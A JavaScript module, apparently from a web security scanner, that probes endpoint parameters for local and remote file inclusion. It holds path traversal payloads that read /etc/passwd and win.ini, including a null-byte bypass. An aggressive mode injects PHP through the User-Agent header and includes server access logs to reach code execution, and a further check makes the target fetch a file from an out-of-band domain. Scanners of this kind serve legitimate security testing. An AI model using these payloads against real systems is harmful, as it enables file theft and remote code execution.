import axios from 'axios';
import { logger } from '../utils/logger.js';

const FILE_PARAMS = ['file', 'path', 'doc', 'document', 'folder', 'dir', 'include', 'page', 'template', 'view', 'content', 'read'];

const LFI_PAYLOADS = [
    { payload: '../../../../../../../../../../etc/passwd', match: /root:x:0:0:/ },
    { payload: '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', match: /\[extensions\]/i },
    { payload: '/etc/passwd', match: /root:x:0:0:/ },
    { payload: 'C:\\windows\\win.ini', match: /\[extensions\]/i },
    // Null byte bypass
    { payload: '../../../../../../../../../../etc/passwd%00.png', match: /root:x:0:0:/ }
];

export async function testFileInclusion(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 10000;
    
    // Only look at endpoints with parameters
    const queryUrl = new URL(endpoint.url);
    const queryParams = Array.from(queryUrl.searchParams.keys());
    const bodyParams = endpoint.data ? Object.keys(endpoint.data) : [];
    const allParams = [...queryParams, ...bodyParams];
    
    if (allParams.length === 0) return findings;

    // Filter to likely file params unless aggressive
    const testParams = options.aggressive ? allParams : allParams.filter(p => 
        FILE_PARAMS.some(fp => p.toLowerCase().includes(fp)) || p.toLowerCase().endsWith('id')
    );
    
    if (testParams.length === 0) return findings;

    logger.info(`[FileInclusion] Testing endpoint: ${endpoint.url}`);

    try {
        let lfiConfirmed = false;
        
        // 1. Local File Inclusion (LFI) & Path Traversal
        for (const param of testParams) {
            for (const probe of LFI_PAYLOADS) {
                const reqUrl = new URL(endpoint.url);
                const reqData = { ...endpoint.data };
                
                if (queryParams.includes(param)) {
                    reqUrl.searchParams.set(param, probe.payload);
                }
                if (bodyParams.includes(param)) {
                    reqData[param] = probe.payload;
                }
                
                try {
                    const resp = await axios({
                        method: endpoint.method,
                        url: reqUrl.toString(),
                        headers: endpoint.headers,
                        data: endpoint.method !== 'GET' ? reqData : undefined,
                        timeout,
                        validateStatus: () => true
                    });
                    
                    const bodyStr = (typeof resp.data === 'string') ? resp.data : JSON.stringify(resp.data);
                    
                    if (probe.match.test(bodyStr)) {
                        lfiConfirmed = true;
                        findings.push({
                            title: 'Local File Inclusion (LFI) / Path Traversal',
                            description: `The parameter '${param}' is vulnerable to path traversal. We successfully read sensitive system files (e.g., /etc/passwd or win.ini).`,
                            category: 'BROKEN_ACCESS_CONTROL',
                            severity: 'HIGH',
                            cvss: 7.5,
                            detectedBy: 'file-inclusion-engine',
                            confidence: 100,
                            evidence: [
                                { type: 'REQUEST', title: 'Payload', content: probe.payload },
                                { type: 'RESPONSE', title: 'File Contents', content: bodyStr.substring(0, 300) + '...' }
                            ],
                            remediation: 'Avoid passing user input directly to filesystem APIs. If required, strictly validate input against an allowlist of permitted file names, and use safe path resolution mechanisms (e.g., realpath() checks).'
                        });
                        break; // Stop testing other LFI payloads for this param if one succeeds
                    }
                } catch (e) {}
            }
        }
        
        // 2. Log Poisoning Escalation (if LFI is confirmed)
        if (lfiConfirmed && options.aggressive) {
            // Attempt to inject PHP code into User-Agent and include access logs
            const logPaths = ['/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log'];
            const poisonPayload = `<?php echo "SECORA_RCE_TEST_" . (7*7); ?>`;
            
            for (const param of testParams) {
                for (const logPath of logPaths) {
                    const reqUrl = new URL(endpoint.url);
                    if (queryParams.includes(param)) reqUrl.searchParams.set(param, `../../../../../../../../../..${logPath}`);
                    
                    try {
                         const resp = await axios.get(reqUrl.toString(), {
                             headers: { ...endpoint.headers, 'User-Agent': poisonPayload },
                             timeout, validateStatus: () => true
                         });
                         
                         const bodyStr = (typeof resp.data === 'string') ? resp.data : JSON.stringify(resp.data);
                         if (bodyStr.includes('SECORA_RCE_TEST_49')) {
                              findings.push({
                                  title: 'Log Poisoning to Remote Code Execution',
                                  description: `Successfully escalated the LFI vulnerability to Remote Code Execution (RCE) by injecting PHP code into the User-Agent header and including the server's access log file.`,
                                  category: 'INJECTION',
                                  severity: 'CRITICAL',
                                  cvss: 9.8,
                                  detectedBy: 'file-inclusion-engine',
                                  confidence: 100,
                                  evidence: [
                                      { type: 'REQUEST', title: 'Poisoned Header', content: `User-Agent: ${poisonPayload}` },
                                      { type: 'RESPONSE', title: 'Execution Output', content: 'Found output: SECORA_RCE_TEST_49' }
                                  ],
                                  remediation: 'Fix the underlying LFI vulnerability. Additionally, ensure log files are not readable by the web server process user.'
                              });
                              break;
                         }
                    } catch (e) {}
                }
            }
        }

        // 3. Remote File Inclusion (RFI)
        if (options.oastClient) {
            const oastDomain = options.oastClient.getDomain();
            
            for (const param of testParams) {
                const reqUrl = new URL(endpoint.url);
                const reqData = { ...endpoint.data };
                const rfiPayload = `http://${oastDomain}/rfi-test.php`;
                
                if (queryParams.includes(param)) reqUrl.searchParams.set(param, rfiPayload);
                if (bodyParams.includes(param)) reqData[param] = rfiPayload;
                
                try {
                     await axios({
                         method: endpoint.method, url: reqUrl.toString(),
                         headers: endpoint.headers, data: endpoint.method !== 'GET' ? reqData : undefined,
                         timeout, validateStatus: () => true
                     });
                     
                     await new Promise(r => setTimeout(r, 2000));
                     const interactions = await options.oastClient.getInteractions();
                     
                     if (interactions && interactions.some(i => i.protocol === 'http' && i.request.url.includes('rfi-test'))) {
                          findings.push({
                              title: 'Remote File Inclusion (RFI)',
                              description: `The parameter '${param}' allows the inclusion of remote files. We successfully forced the server to request a file from our OAST server. This directly leads to Remote Code Execution.`,
                              category: 'INJECTION',
                              severity: 'CRITICAL',
                              cvss: 9.8,
                              detectedBy: 'file-inclusion-engine',
                              confidence: 100,
                              evidence: [
                                  { type: 'REQUEST', title: 'RFI Payload', content: rfiPayload },
                                  { type: 'NETWORK', title: 'OAST Interaction', content: 'Server fetched remote file.' }
                              ],
                              remediation: 'Disable remote file inclusion in runtime configuration (e.g., `allow_url_include = Off` in PHP). Strictly validate input.'
                          });
                     }
                } catch (e) {}
            }
        }

    } catch (e) {
        logger.error(`[FileInclusion] Test failed: ${e.message}`);
    }

    return findings;
}
